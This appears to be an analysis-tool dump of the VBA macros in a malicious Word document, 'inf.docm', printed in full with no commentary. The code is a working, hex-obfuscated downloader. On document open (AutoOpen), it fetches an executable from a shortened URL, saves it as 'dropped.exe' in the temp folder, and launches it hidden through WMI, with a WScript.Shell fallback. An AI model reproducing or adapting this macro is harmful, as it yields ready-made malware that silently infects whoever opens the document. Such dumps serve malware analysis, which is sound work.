===============================================================================
FILE: inf.docm
Type: OpenXML
-------------------------------------------------------------------------------

- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub avscuqctk()
Dim vxedylctlyqvkl As String
Dim yxxqowke As String
Dim yqlcangepvrccrx As Object, tmffoscpfdripcxpd As Object
Dim afcbydld As Integer
vxedylctlyqvkl = hgmneqolwgxg("68747470733a2f2f74696e") & hgmneqolwgxg("7975726c2e636f6d2f67327a3267683666")
yxxqowke = hgmneqolwgxg("64726f") & hgmneqolwgxg("707065642e657865")
yxxqowke = Environ("TEMP") & "\" & yxxqowke
Set yqlcangepvrccrx = CreateObject(hgmneqolwgxg("4d53584d4c322e") & hgmneqolwgxg("536572766572584d4c485454502e362e30"))
yqlcangepvrccrx.setOption(2) = 13056
yqlcangepvrccrx.Open hgmneqolwgxg("474554"), vxedylctlyqvkl, False
yqlcangepvrccrx.setRequestHeader hgmneqolwgxg("557365") & hgmneqolwgxg("722d4167656e74"), hgmneqolwgxg("4d6f7a696c6c612f342e302028636f6d7061") & hgmneqolwgxg("7469626c653b204d53494520362e303b2057696e646f7773204e5420352e3029")
yqlcangepvrccrx.Send
If yqlcangepvrccrx.Status = 200 Then
Set tmffoscpfdripcxpd = CreateObject(hgmneqolwgxg("41444f") & hgmneqolwgxg("44422e53747265616d"))
tmffoscpfdripcxpd.Open
tmffoscpfdripcxpd.Type = 1
tmffoscpfdripcxpd.Write yqlcangepvrccrx.ResponseBody
tmffoscpfdripcxpd.SaveToFile yxxqowke, 2
tmffoscpfdripcxpd.Close
jausltewrjghdtvi yxxqowke
End If
End Sub
Sub AutoOpen()
avscuqctk
End Sub
Private Function hgmneqolwgxg(ByVal mynmavyclwok As String) As String
Dim ejdwyblxvgpy As Long
For ejdwyblxvgpy = 1 To Len(mynmavyclwok) Step 2
hgmneqolwgxg = hgmneqolwgxg & Chr$(Val("&H" & Mid$(mynmavyclwok, ejdwyblxvgpy, 2)))
Next ejdwyblxvgpy
End Function

-------------------------------------------------------------------------------
VBA MACRO cuabumrbh.bas 
in file: word/vbaProject.bin - OLE stream: 'VBA/cuabumrbh'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub txsctapysvyvh(xflqpurtgr As String)
CreateObject(jmkrohkvctnt("575363726970742e5368656c") & jmkrohkvctnt("6c")).Run xflqpurtgr, 0
End Sub
Private Function jmkrohkvctnt(ByVal vgqofbnoswth As String) As String
Dim nfwbabqqwqxf As Long
For nfwbabqqwqxf = 1 To Len(vgqofbnoswth) Step 2
jmkrohkvctnt = jmkrohkvctnt & Chr$(Val("&H" & Mid$(vgqofbnoswth, nfwbabqqwqxf, 2)))
Next nfwbabqqwqxf
End Function

-------------------------------------------------------------------------------
VBA MACRO cwzbjoiuq.bas 
in file: word/vbaProject.bin - OLE stream: 'VBA/cwzbjoiuq'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub jausltewrjghdtvi(tibgkzhn As String)
On Error Resume Next
Err.Clear
wimResult = kshliitwryv(tibgkzhn)
If Err.Number <> 0 Or wimResult <> 0 Then
Err.Clear
txsctapysvyvh tibgkzhn
End If
On Error GoTo 0
End Sub

-------------------------------------------------------------------------------
VBA MACRO lkxosgcqm.bas 
in file: word/vbaProject.bin - OLE stream: 'VBA/lkxosgcqm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function kshliitwryv(cmdLine As String) As Integer
Set rpmcsqkfmmefrk = GetObject(lylhbzknnnzm("77696e6d676d74") & lylhbzknnnzm("733a5c5c2e5c726f6f745c63696d7632"))
Set apcpmobozbywheter = rpmcsqkfmmefrk.Get(lylhbzknnnzm("57696e33325f50726f6365") & lylhbzknnnzm("737353746172747570"))
Set ojuovddfgrz = apcpmobozbywheter.SpawnInstance_
ojuovddfgrz.ShowWindow = 0
Set jcjvmxzi = GetObject(lylhbzknnnzm("77696e6d676d74733a5c5c2e5c726f6f745c63696d76323a57") & lylhbzknnnzm("696e33325f50726f63657373"))
kshliitwryv = jcjvmxzi.Create(cmdLine, Null, ojuovddfgrz, intProcessID)
End Function
Private Function lylhbzknnnzm(ByVal wawaggaffhsu As String) As String
Dim uuhcyhapguna As Long
For uuhcyhapguna = 1 To Len(wawaggaffhsu) Step 2
lylhbzknnnzm = lylhbzknnnzm & Chr$(Val("&H" & Mid$(wawaggaffhsu, uuhcyhapguna, 2)))
Next uuhcyhapguna
End Function
